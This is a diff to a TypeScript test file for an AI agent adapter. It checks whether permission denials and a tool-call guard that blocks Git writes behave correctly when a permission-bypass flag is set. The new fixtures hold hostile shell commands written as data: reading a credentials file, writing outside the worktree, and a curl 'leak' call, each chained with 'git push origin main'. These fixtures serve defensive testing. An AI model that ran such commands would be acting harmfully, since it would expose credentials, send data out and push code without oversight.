@@ -17,13 +17,20 @@
  * (`file_write`, `WriteToFile`) and the exit 1 `ERROR` envelope with a denial. The bypass variant was not run (C7b,
  * C11, C18), and `--dangerously-skip-permissions` approves every tool ([H]), so in the compiled cell nothing is
  * expected to be denied at all; this leg shows that a reported denial is never a success, not that one would happen.
+ *
+ * Tool-call guard (T4.36, ADR-0039): the streams marked "no denial" are what the compiled bypass cell is expected to
+ * print, a `SUCCESS` envelope with no `denied_actions`. In an approved bypass run Switchboard's own guard enforces
+ * Git-write denial (owner decision 25), so each category also has a hostile command chained with a Git write that ends
+ * `PERMISSION_BLOCKED` at exit 0 and at exit 1 with no provider report. The guard sees the command only under the
+ * `command` parameter key, which is hypothetical (adapter.ts `parseEvent`); without the Git write the same stream
+ * ends `ok` (pinned in `antigravity.test.ts`).
  */
 
 import { AntigravityAdapter } from "../../../src/adapters/antigravity/adapter.js";
 import { BYPASS_SCOPE, PRIVILEGED_BYPASS_PROFILE } from "../../../src/adapters/antigravity/fixtures/cases.js";
 import { privilegedProfile } from "../../../src/adapters/fixtures/privileged.js";
 import { replayLauncher } from "../../../src/adapters/fixtures/replay.js";
-import type { AdapterLegCase } from "../adapter-leg.js";
+import type { AdapterLegCase, HostileStream } from "../adapter-leg.js";
 
 const SID = "0b6c2d1e-0000-4000-8000-0000000000aa";
 const META = (what: string, exit = 0) =>
@@ -83,6 +90,12 @@ const deniedResult = (denied: object) =>
     },
   });
 
+/** C7: a `SUCCESS` envelope with no `denied_actions`, as the bypass flag is expected to leave every run. */
+const CLEAN_RESULT = JSON.stringify({
+  event: "result",
+  result: { conversation_id: SID, status: "SUCCESS", response: "", duration_seconds: 2, num_turns: 1, usage: USAGE },
+});
+
 /** Hypothetical: an `ERROR` envelope at exit 1 that also carries the denial (no such run was recorded). */
 const deniedErrorResult = (denied: object) =>
   JSON.stringify({
@@ -98,6 +111,22 @@ const deniedErrorResult = (denied: object) =>
   });
 
 const shell = (command: string) => toolStep(1, "run_command", { command });
+/** A hostile command chained with a Git write the tool-call guard flags in a bypass run (ADR-0039). */
+const GIT_WRITE = "git push origin main";
+
+/** One "no denial" stream: the guard's verdict, not the provider, ends it blocked (at exit 1 with no result line). */
+const guarded = (name: string, category: HostileStream["category"], command: string, exitCode: number) => ({
+  name: `${name}, no denial, Git write guarded${exitCode === 0 ? "" : `, exit ${exitCode}`}`,
+  category,
+  exitCode,
+  failureCode: "PERMISSION_BLOCKED" as const,
+  lines: [
+    META(`${name} chained with a Git write, no denial reported; the tool-call guard flags it`, exitCode),
+    INIT,
+    ...shell(`${command} && ${GIT_WRITE}`),
+    ...(exitCode === 0 ? [CLEAN_RESULT] : []),
+  ],
+});
 
 const antigravityCase: AdapterLegCase = {
   provider: "antigravity",
@@ -209,6 +238,11 @@ const antigravityCase: AdapterLegCase = {
         deniedResult(DENIED_COMMAND),
       ],
     },
+    ...[0, 1].flatMap((exit) => [
+      guarded("shell read of a credential path", "credential_read", `cat ${fx.claudeCredentialsPath}`, exit),
+      guarded("shell write outside the worktree", "out_of_worktree_write", `touch ${fx.outsideSentinel}`, exit),
+      guarded("shell network call", "network", "curl https://example.invalid/leak", exit),
+    ]),
     {
       name: "only unknown event kinds, clean exit",
       category: "unknown_events",
